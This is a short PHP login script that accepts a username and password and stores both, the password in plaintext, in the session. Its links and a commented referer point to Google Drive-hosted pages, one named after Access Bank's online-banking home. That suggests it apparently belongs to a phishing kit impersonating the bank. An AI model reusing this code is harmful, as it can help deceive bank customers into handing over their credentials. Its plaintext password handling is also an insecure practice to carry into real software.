<?php ob_start(); ?>
<?php session_start();
    // $referer = 'https://googledrive.com/host/0BzeMUmBgRLMmY0p6X0dYREl4X28/subs.accessbankplc.com/gh/onlinebankinghome.html';
$_SESSION['loggedin'] = false;
?>
<?php require ('includes/init.php'); ?>
<?php
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);
    if(!empty($username) && !empty($password)){
        if(login($username, $password)){
            // SESSION;
            $_SESSION['loggedin'] =  true;
            $_SESSION['username'] = $username;
            $_SESSION['password'] = $password;
            // header redirect user to login
            header('location: account_summary.php');
        }else{
            echo $errors[] = 'Invalid login information';
            echo "<br />";
            echo "<a href=\"https://googledrive.com/host/0B3DomE_xpmLsczdhYkxGa285U3c/online/\">Please go back</a>";
        }
    }else{
            echo $errors[] = 'All fields are required';
            echo "<br />";
            echo "<a href=\"https://googledrive.com/host/0B3DomE_xpmLsczdhYkxGa285U3c/online/\">Please go back</a>";
    }
}
?>

        
